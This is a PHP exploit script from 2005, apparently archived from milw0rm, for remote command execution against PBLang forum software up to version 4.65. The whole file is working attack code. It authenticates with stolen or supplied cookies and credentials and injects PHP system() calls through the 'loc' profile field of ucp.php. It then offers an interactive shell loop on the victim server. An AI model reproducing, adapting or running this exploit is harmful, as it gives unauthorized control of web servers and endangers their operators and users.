<?php
#
|    ##############################################    |
|    # PBLang <= 4.65 remote commands exec exploit#    |
|    # tested on 4.65                             #    |
|    # (c)oded by Pengo 2005 RST/GHC              #    |
|    # http://rst.void.ru                         #    |
|    # http://ghc.ru                              #    |
|    ##############################################    |
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# WARNING! This exploit is successfully work when magic_quotes_rpc off =(
# D:\httpd\php>php.exe ..\www\r57pblang465.php localhost /pbl/ "pblcookie732128=Pe
# ng0; PBLsecid=a4c2f845c002ac54f5751440647f3c91;" Peng0 PrSrS
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ARGV = $_SERVER['argv'];
global $ARGV;
if(count($ARGV) == 0)
{
 echo base64_decode("3fLu8iDx6vDo7/Ig5O7r5uXtIOH78vwg5+Dv8/nl7SDo5yDq7uzg7eTt7u
kg8fLw7uroLiDR7eD34OvgIO3z5u3uIOfg8OXj6PHy8Ojw7uLg8vzx/yDoDQroIOfg6+7j6O3o8vzx/
yDt4CD25evl4u7sIPTu8PPs5Swg5+Dy5ewg7fPm7e4g7+7x7O7y8PLl8vwg6vPq6DogcGJsY29va2llI
FBCTHNlY2lkLg0KxfHr6CDi6uv+9+Xt+yBtYWdpY19xdW90ZXNfcnBjIPHq8Ojv8iDt5SD08+3q9uju7
ejw8+XyLg==");
 exit;
}

if (count($ARGV) < 5)
{
 echo '############################################################
     PBLang <=4.65 remote command execution exploit
        by RST/GHC // rst.void.ru / ghc.ru //
############################################################
 usage:
 r57pblang465.php [URL] [DIR] [COOKIE] [LOGIN] [PASS] [PROXI:PORT]
 params:
  [URL] - server url e.g. www.host.ru
  [DIR] - directory where PBLang installed e.g. /forum/ or /
  [COOKIE] - e.g. "pblcookie732128=Peng0; PBLsecid=a4c2f845c002ac54f5751440647f3c91;"
  [NAME] - your account name
  [PASS] - your account pass
  [PROXI:PORT] - e.g. "130.208.18.30:3128" (optional)
############################################################';
 exit;
}

$serv   = $ARGV[1];
$dir    = $ARGV[2];
$cookie = $ARGV[3];
$login  = $ARGV[4];
$pass   = $ARGV[5];

if(isset($ARGV[6]))
{
 $ARGV[6] = parse_url($ARGV[6]);
 $host = $ARGV[6]['host'];
 $port = $ARGV[6]['port'];
} else {
 $host = $serv;
 $port = '80';
}

function create_socket($hostname,$portt,$post)
{
 $socket = @fsockopen($hostname, $portt, $errno, $errstr, 60)
            or die ("\n[-] CONNECT FAILED\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n");
 $answer = '';
 fwrite($socket,$post);
 while (!feof($socket))
 {
  $answer .= fgets($socket, 128);
 }
 fclose($socket);
 return $answer;
}

$a = 1;

print "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";
print "\nexample 'close'\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";

$din = fopen('php://stdin','r');

while ($a !== 0)
{
 print "shell>"; $cmd = fgets($din, 100);
 if(!stristr($cmd,'close'))
 {
  echo $cmd."\n";

  $query = "user=";
  $query .= $login;
  $query .= "&pass=";
  $query .= $pass;
  $query .= "&pass2=";
  $query .= $pass;
  $query .= "&oldpass=";
  $query .= $pass;
  $query .= "&em=cool@hacker.ru&emhide=hide";
  $query .= "&realname=&alias=".$login."&msn=&icq=&aim=&yahoo=&qq=&web=http%3A%2F%2F";
  $query .= "&loc=%22%3B+system%28%22echo%20%5F%45%4E%54%45%52%5F%3B%20";
  $query .= $cmd;
  $query .= "%3B%20%5F%51%55%49%54%5F%22%29%3B+echo+%22";
  $query .= "&pt=rst.ghc%21&av=none&webav=&sig=&regcode=1125428486&lang=en&accept=1&Submit=%CE%F2%EF%F0%E0%E2%E8%F2%FC";

  $post = "POST http://".$serv.$dir."ucp.php?id=2&user=".$login." HTTP/1.0\r\nHost: ".$serv."\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/4.0\r\nCookie: ".$cookie."\r\nContent-Length: ".strlen($query)."\r\n\r\n$query";

  $answer = create_socket($host,$port,$post);
/*
  $fp = fopen('lol.htm','w');
  fwrite($fp,$answer);
  fclose($fp);
*/
  if (eregi("_ENTER_(.*)_QUIT_" , $answer, $cut))
  {
   $a = 1;
   echo $cut[1];
   echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
  } else {
    echo "\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
    echo "[-] EXPLOIT FAILD\r\n";
    echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
   $a = 0;
  }
 } else {
  echo "\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
  echo "[-] EXPLOIT CLOSED\r\n";
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
  $a = 0;
  fclose($din);
 }
}

?>

# milw0rm.com [2005-09-07]
